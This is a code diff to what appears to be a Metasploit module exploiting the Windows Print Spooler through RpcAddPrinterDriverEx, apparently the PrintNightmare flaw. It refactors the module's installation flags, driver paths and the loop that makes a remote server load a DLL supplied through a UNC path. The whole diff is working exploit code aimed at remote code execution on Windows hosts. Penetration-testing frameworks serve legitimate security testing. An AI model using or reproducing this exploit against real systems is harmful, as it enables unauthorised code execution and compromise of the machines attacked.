@@ -15,6 +15,17 @@ module PrintSystem
   # Operation numbers
   RPC_ADD_PRINTER_DRIVER_EX = 89
 
+  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b
+  APD_STRICT_UPGRADE = 0x00000001
+  APD_STRICT_DOWNGRADE = 0x00000002
+  APD_COPY_ALL_FILES = 0x00000004
+  APD_COPY_NEW_FILES = 0x00000008
+  APD_COPY_FROM_DIRECTORY = 0x00000010
+  APD_DONT_COPY_FILES_TO_CLUSTER = 0x00001000
+  APD_COPY_TO_ALL_SPOOLERS = 0x00002000
+  APD_INSTALL_WARNED_DRIVER = 0x00008000
+  APD_RETURN_BLOCKING_STATUS_CODE = 0x00010000
+
   # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2
   class DriverInfo2 < BinData::Record
     endian :little
@@ -137,7 +148,9 @@ class MetasploitModule < Msf::Auxiliary
           'Reliability' => [
             UNRELIABLE_SESSION # appears to fail after succeeding once until the server is restarted
           ],
-          'SideEffects' => []
+          'SideEffects' => [
+            ARTIFACTS_ON_DISK # the dll will be copied to the remote server
+          ]
         }
       )
     )
@@ -163,6 +176,9 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NoAccess, 'Failed to authenticate to the remote service.')
     end
 
+    arch = dcerpc_getarch
+    print_status("Targeting Windows v#{simple.client.os_version} (#{arch})")
+
     handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
     vprint_status("Binding to #{handle} ...")
     begin
@@ -174,6 +190,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Bound to #{handle} ...")
     vprint_status('Obtaining a service manager handle...')
 
+    filename = datastore['UNC_PATH'].split('\\').last
     container = PrintSystem::DriverContainer.new(
       level: 2,
       tag: 2,
@@ -187,25 +204,19 @@ class MetasploitModule < Msf::Auxiliary
         # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913
         p_name: "#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}",
         p_environment: 'Windows x64',
-        p_driver_path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL',
+        p_driver_path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_dcef07064d319714\\Amd64\\UNIDRV.DLL',
         p_data_file: datastore['UNC_PATH'],
-        p_config_file: 'C:\\Windows\\System32\\kernelbase.dll'
+        p_config_file: 'C:\\Windows\\System32\\kernel32.dll'
       )
     )
 
-    filename = datastore['UNC_PATH'].split('\\').last
+    flags = PrintSystem::APD_INSTALL_WARNED_DRIVER | PrintSystem::APD_COPY_FROM_DIRECTORY | PrintSystem::APD_COPY_ALL_FILES
+    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
 
-    # TODO: properly define the flags value
-    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, 0x8014)
-
-    container.driver_info.p_config_file.assign("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\#{filename}")
-    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, 0x8014)
-
-    container.driver_info.p_config_file.assign("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\2\\#{filename}")
-    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, 0x8014)
-
-    container.driver_info.p_config_file.assign("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\3\\#{filename}")
-    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, 0x8014)
+    1.upto(3) do |directory|
+      container.driver_info.p_config_file.assign("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\#{directory}\\#{filename}")
+      add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
+    end
   end
 
   def add_printer_driver_ex(name, container, flags)
